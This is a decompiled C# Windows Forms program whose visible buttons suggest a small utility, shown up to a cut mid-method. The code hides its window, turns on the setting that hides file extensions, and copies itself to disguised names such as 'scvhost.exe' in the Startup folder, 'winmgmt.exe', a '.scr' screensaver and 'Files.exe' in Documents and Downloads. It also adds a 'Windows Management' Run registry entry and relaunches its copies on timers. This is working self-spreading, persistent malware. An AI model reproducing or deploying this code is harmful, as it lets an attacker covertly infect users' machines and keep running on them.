using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using WindowsApplication.My;

namespace WindowsApplication;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("ListBox1")]
	private ListBox _ListBox1;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("tr1")]
	private Timer _tr1;

	[AccessedThroughProperty("tr2")]
	private Timer _tr2;

	[AccessedThroughProperty("trprcsrun1")]
	private Timer _trprcsrun1;

	[AccessedThroughProperty("trusbc")]
	private Timer _trusbc;

	[AccessedThroughProperty("btnstart")]
	private Button _btnstart;

	[AccessedThroughProperty("btnclrdlg")]
	private Button _btnclrdlg;

	[AccessedThroughProperty("btncase")]
	private Button _btncase;

	[AccessedThroughProperty("btnlist")]
	private Button _btnlist;

	[AccessedThroughProperty("trprcrun2")]
	private Timer _trprcrun2;

	private string appstartpath1;

	private string appregpath1;

	private string appstartpath2;

	private string appregapth2;

	internal virtual ListBox ListBox1
	{
		get
		{
			return _ListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox1 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual Timer tr1
	{
		get
		{
			return _tr1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = tr1_Tick;
			if (_tr1 != null)
			{
				_tr1.remove_Tick(eventHandler);
			}
			_tr1 = value;
			if (_tr1 != null)
			{
				_tr1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer tr2
	{
		get
		{
			return _tr2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = tr2_Tick;
			if (_tr2 != null)
			{
				_tr2.remove_Tick(eventHandler);
			}
			_tr2 = value;
			if (_tr2 != null)
			{
				_tr2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer trprcsrun1
	{
		get
		{
			return _trprcsrun1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = trprcsrun1_Tick;
			if (_trprcsrun1 != null)
			{
				_trprcsrun1.remove_Tick(eventHandler);
			}
			_trprcsrun1 = value;
			if (_trprcsrun1 != null)
			{
				_trprcsrun1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer trusbc
	{
		get
		{
			return _trusbc;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = trusbc_Tick;
			if (_trusbc != null)
			{
				_trusbc.remove_Tick(eventHandler);
			}
			_trusbc = value;
			if (_trusbc != null)
			{
				_trusbc.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Button btnstart
	{
		get
		{
			return _btnstart;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = btnstart_Click;
			if (_btnstart != null)
			{
				((Control)_btnstart).remove_Click(eventHandler);
			}
			_btnstart = value;
			if (_btnstart != null)
			{
				((Control)_btnstart).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button btnclrdlg
	{
		get
		{
			return _btnclrdlg;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_btnclrdlg = value;
		}
	}

	internal virtual Button btncase
	{
		get
		{
			return _btncase;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = btncase_Click;
			if (_btncase != null)
			{
				((Control)_btncase).remove_Click(eventHandler);
			}
			_btncase = value;
			if (_btncase != null)
			{
				((Control)_btncase).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button btnlist
	{
		get
		{
			return _btnlist;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = btnlist_Click;
			if (_btnlist != null)
			{
				((Control)_btnlist).remove_Click(eventHandler);
			}
			_btnlist = value;
			if (_btnlist != null)
			{
				((Control)_btnlist).add_Click(eventHandler);
			}
		}
	}

	internal virtual Timer trprcrun2
	{
		get
		{
			return _trprcrun2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = trprcrun2_Tick;
			if (_trprcrun2 != null)
			{
				_trprcrun2.remove_Tick(eventHandler);
			}
			_trprcrun2 = value;
			if (_trprcrun2 != null)
			{
				_trprcrun2.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Activated((EventHandler)Form1_Activated);
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0065: Expected O, but got Unknown
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_0091: Expected O, but got Unknown
		//IL_0098: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a2: Expected O, but got Unknown
		components = new Container();
		ListBox1 = new ListBox();
		TextBox1 = new TextBox();
		tr1 = new Timer(components);
		tr2 = new Timer(components);
		trprcsrun1 = new Timer(components);
		trusbc = new Timer(components);
		btnstart = new Button();
		btnclrdlg = new Button();
		btncase = new Button();
		btnlist = new Button();
		trprcrun2 = new Timer(components);
		((Control)this).SuspendLayout();
		((ListControl)ListBox1).set_FormattingEnabled(true);
		ListBox listBox = ListBox1;
		Point location = new Point(166, 32);
		((Control)listBox).set_Location(location);
		((Control)ListBox1).set_Name("ListBox1");
		ListBox listBox2 = ListBox1;
		Size size = new Size(48, 108);
		((Control)listBox2).set_Size(size);
		((Control)ListBox1).set_TabIndex(0);
		TextBox textBox = TextBox1;
		location = new Point(53, 157);
		((Control)textBox).set_Location(location);
		TextBox1.set_Multiline(true);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		size = new Size(161, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(1);
		tr1.set_Interval(200);
		tr2.set_Interval(200);
		trprcsrun1.set_Enabled(true);
		trusbc.set_Enabled(true);
		trusbc.set_Interval(1000);
		Button obj = btnstart;
		location = new Point(25, 54);
		((Control)obj).set_Location(location);
		((Control)btnstart).set_Name("btnstart");
		Button obj2 = btnstart;
		size = new Size(74, 30);
		((Control)obj2).set_Size(size);
		((Control)btnstart).set_TabIndex(2);
		((ButtonBase)btnstart).set_Text("&Start");
		((ButtonBase)btnstart).set_UseVisualStyleBackColor(true);
		Button obj3 = btnclrdlg;
		location = new Point(32, 199);
		((Control)obj3).set_Location(location);
		((Control)btnclrdlg).set_Name("btnclrdlg");
		Button obj4 = btnclrdlg;
		size = new Size(78, 31);
		((Control)obj4).set_Size(size);
		((Control)btnclrdlg).set_TabIndex(3);
		((ButtonBase)btnclrdlg).set_Text("&Color Dialog");
		((ButtonBase)btnclrdlg).set_UseVisualStyleBackColor(true);
		Button obj5 = btncase;
		location = new Point(28, 96);
		((Control)obj5).set_Location(location);
		((Control)btncase).set_Name("btncase");
		Button obj6 = btncase;
		size = new Size(71, 34);
		((Control)obj6).set_Size(size);
		((Control)btncase).set_TabIndex(4);
		((ButtonBase)btncase).set_Text("Change  Case");
		((ButtonBase)btncase).set_UseVisualStyleBackColor(true);
		Button obj7 = btnlist;
		location = new Point(137, 199);
		((Control)obj7).set_Location(location);
		((Control)btnlist).set_Name("btnlist");
		Button obj8 = btnlist;
		size = new Size(77, 30);
		((Control)obj8).set_Size(size);
		((Control)btnlist).set_TabIndex(5);
		((ButtonBase)btnlist).set_Text("List Numbers");
		((ButtonBase)btnlist).set_UseVisualStyleBackColor(true);
		trprcrun2.set_Enabled(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(284, 262);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)btnlist);
		((Control)this).get_Controls().Add((Control)(object)btncase);
		((Control)this).get_Controls().Add((Control)(object)btnclrdlg);
		((Control)this).get_Controls().Add((Control)(object)btnstart);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Form1_Activated(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 145:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_000f;
						case 4:
							goto IL_0018;
						case 5:
							goto IL_0029;
						case 6:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 7:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0029:
					num = 5;
					Interaction.Shell("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v HideFileExt /t REG_DWORD /d 1 /f", (AppWinStyle)2, false, -1);
					break;
					IL_0007:
					num = 2;
					((Control)this).Hide();
					goto IL_000f;
					IL_000f:
					num = 3;
					((Form)this).set_ShowInTaskbar(false);
					goto IL_0018;
					IL_0018:
					num = 4;
					((Control)MyProject.Forms.Frmprocess).Show();
					goto IL_0029;
					end_IL_0000_2:
					break;
				}
				num = 6;
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Interaction.Environ("userprofile") + "\\Live Screen Saver.scr");
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 145;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 351:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0018;
						case 4:
							goto IL_0020;
						case 5:
							goto IL_0029;
						case 6:
							goto IL_0051;
						case 7:
							goto IL_006d;
						case 8:
							goto IL_0089;
						case 9:
							goto IL_0097;
						case 11:
							goto IL_00ab;
						case 12:
							goto IL_00ae;
						case 13:
							goto IL_00cb;
						case 14:
							goto IL_00e8;
						case 15:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 10:
						case 16:
						case 17:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00e8:
					num = 14;
					tr2.set_Enabled(true);
					break;
					IL_0007:
					num = 2;
					((Control)MyProject.Forms.Frmprocess).Show();
					goto IL_0018;
					IL_0018:
					num = 3;
					((Control)this).Hide();
					goto IL_0020;
					IL_0020:
					num = 4;
					((Form)this).set_ShowInTaskbar(false);
					goto IL_0029;
					IL_0029:
					num = 5;
					if (Conversions.ToDouble(((ServerComputer)MyProject.Computer).get_Info().get_OSVersion().Substring(0, 1)) != 5.0)
					{
						goto IL_0051;
					}
					goto IL_00ab;
					IL_0051:
					num = 6;
					appstartpath1 = Interaction.Environ("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\scvhost.exe";
					goto IL_006d;
					IL_006d:
					num = 7;
					appregpath1 = Interaction.Environ("appdata") + "\\Microsoft\\Windows\\winmgmt.exe";
					goto IL_0089;
					IL_0089:
					num = 8;
					tr1.set_Enabled(true);
					goto IL_0097;
					IL_0097:
					num = 9;
					trprcsrun1.set_Enabled(true);
					goto end_IL_0000_3;
					IL_00ab:
					num = 11;
					goto IL_00ae;
					IL_00ae:
					num = 12;
					appstartpath2 = Interaction.Environ("userprofile") + "\\Start Menu\\Programs\\Startup\\scvhost.exe";
					goto IL_00cb;
					IL_00cb:
					num = 13;
					appregapth2 = Interaction.Environ("systemroot") + "\\winmgmt.exe";
					goto IL_00e8;
					end_IL_0000_2:
					break;
				}
				num = 15;
				trprcrun2.set_Enabled(true);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 351;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void tr1_Tick(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 81:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_000f;
						case 4:
							goto IL_0017;
						case 5:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 6:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0017:
					num = 4;
					chkreg1();
					break;
					IL_0007:
					num = 2;
					cptstartup1();
					goto IL_000f;
					IL_000f:
					num = 3;
					chkstartuppath1();
					goto IL_0017;
					end_IL_0000_2:
					break;
				}
				num = 5;
				cptdocddnld1();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 81;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void cptstartup1()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 163:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0020;
						case 4:
						case 5:
							goto IL_003c;
						case 6:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 7:
						case 8:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_003c:
					num = 5;
					if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(appregpath1))
					{
						goto end_IL_0000_3;
					}
					break;
					IL_0007:
					num = 2;
					if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(appstartpath1))
					{
						goto IL_0020;
					}
					goto IL_003c;
					IL_0020:
					num = 3;
					((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), appstartpath1);
					goto IL_003c;
					end_IL_0000_2:
					break;
				}
				num = 6;
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), appregpath1);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 163;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void chkstartuppath1()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 176:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 5:
							goto IL_0039;
						case 6:
							goto IL_003b;
						case 7:
							goto IL_0049;
						case 8:
							goto IL_0057;
						case 9:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 3:
						case 4:
						case 10:
						case 11:
						case 12:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0057:
					num = 8;
					Application.Exit();
					break;
					IL_0007:
					num = 2;
					if ((Operators.CompareString(Application.get_ExecutablePath(), appstartpath1, false) == 0) | (Operators.CompareString(Application.get_ExecutablePath(), appregpath1, false) == 0))
					{
						goto end_IL_0000_3;
					}
					goto IL_0039;
					IL_0039:
					num = 5;
					goto IL_003b;
					IL_003b:
					num = 6;
					Process.Start(appstartpath1);
					goto IL_0049;
					IL_0049:
					num = 7;
					Process.Start(appregpath1);
					goto IL_0057;
					end_IL_0000_2:
					break;
				}
				num = 9;
				((Form)this).Close();
				ProjectData.EndApp();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 176;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void chkreg1()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		RegistryKey registryKey = default(RegistryKey);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 132:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_001b;
						case 4:
							goto IL_002f;
						case 5:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 6:
						case 7:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_002f:
					num = 4;
					if (Operators.CompareString(text, appregpath1, false) == 0)
					{
						goto end_IL_0000_3;
					}
					break;
					IL_0007:
					num = 2;
					registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\Currentversion\\Run", writable: true);
					goto IL_001b;
					IL_001b:
					num = 3;
					text = Conversions.ToString(registryKey.GetValue("Windows Management"));
					goto IL_002f;
					end_IL_0000_2:
					break;
				}
				num = 5;
				registryKey.SetValue("Windows Management", appregpath1);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 132;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void cptdocddnld1()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 203:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_001f;
						case 4:
							goto IL_0037;
						case 5:
							goto IL_004c;
						case 6:
						case 7:
							goto IL_0064;
						case 8:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 9:
						case 10:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0064:
					num = 7;
					if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(text))
					{
						goto end_IL_0000_3;
					}
					break;
					IL_0007:
					num = 2;
					text2 = Interaction.Environ("USERPROFILE") + "\\Documents\\Files.exe";
					goto IL_001f;
					IL_001f:
					num = 3;
					text = Interaction.Environ("USERPROFILE") + "\\Downloads\\Files.exe";
					goto IL_0037;
					IL_0037:
					num = 4;
					if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(text2))
					{
						goto IL_004c;
					}
					goto IL_0064;
					IL_004c:
					num = 5;
					((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), text2);
					goto IL_0064;
					end_IL_0000_2:
					break;
				}
				num = 8;
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), text);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 203;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public int PR(string processname)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					break;
				case 56:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 3:
							goto end_IL_0000_3;
						}
						goto default;
					}
					end_IL_0000_2:
					break;
				}
				num = 2;
				num5 = checked(Process.GetProcessesByName(processname).GetUpperBound(0) + 1);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 56;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		int result = num5;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private void trprcsrun1_Tick(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 201:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0017;
						case 4:
						case 5:
							goto IL_0028;
						case 6:
							goto IL_0038;
						case 7:
						case 8:
							goto IL_0049;
						case 9:
							goto IL_0059;
						case 10:
						case 11:
							goto IL_0062;
						case 12:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 13:
						case 14:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0062:
					num = 11;
					if (PR("scvhost") <= 6)
					{
						goto end_IL_0000_3;
					}
					break;
					IL_0007:
					num = 2;
					if (PR("winmgmt") == 0)
					{
						goto IL_0017;
					}
					goto IL_0028;
					IL_0017:
					num = 3;
					Interaction.Shell(appregpath1, (AppWinStyle)2, false, -1);
					goto IL_0028;
					IL_0028:
					num = 5;
					if (PR("scvhost") == 0)
					{
						goto IL_0038;
					}
					goto IL_0049;
					IL_0038:
					num = 6;
					Interaction.Shell(appstartpath1, (AppWinStyle)2, false, -1);
					goto IL_0049;
					IL_0049:
					num = 8;
					if (PR("winmgmt") > 5)
					{
						goto IL_0059;
					}
					goto IL_0062;
					IL_0059:
					num = 9;
					killmgmt();
					goto IL_0062;
					end_IL_0000_2:
					break;
				}
				num = 12;
				killsochst();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 201;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void killsochst()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		Process[] processes = default(Process[]);
		Process process = default(Process);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 117:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0018;
						case 4:
							goto IL_002f;
						case 5:
							goto IL_0038;
						case 6:
							goto IL_003c;
						default:
							goto end_IL_0000;
						case 7:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_0038:
					num5 = checked(num5 + 1);
					goto IL_003c;
					IL_0007:
					num = 2;
					processes = Process.GetProcesses();
					num5 = 0;
					goto IL_003f;
					IL_003f:
					if (num5 < processes.Length)
					{
						process = processes[num5];
						goto IL_0018;
					}
					goto end_IL_0000_2;
					IL_003c:
					num = 6;
					goto IL_003f;
					IL_0018:
					num = 3;
					if (Operators.CompareString(process.ProcessName, "scvhost", false) == 0)
					{
						goto IL_002f;
					}
					goto IL_0038;
					IL_002f:
					num = 4;
					process.Kill();
					goto IL_0038;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 117;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void killmgmt()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		Process[] processes = default(Process[]);
		Process process = default(Process);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 117:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0018;
						case 4:
							goto IL_002f;
						case 5:
							goto IL_0038;
						case 6:
							goto IL_003c;
						default:
							goto end_IL_0000;
						case 7:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_0038:
					num5 = checked(num5 + 1);
					goto IL_003c;
					IL_0007:
					num = 2;
					processes = Process.GetProcesses();
					num5 = 0;
					goto IL_003f;
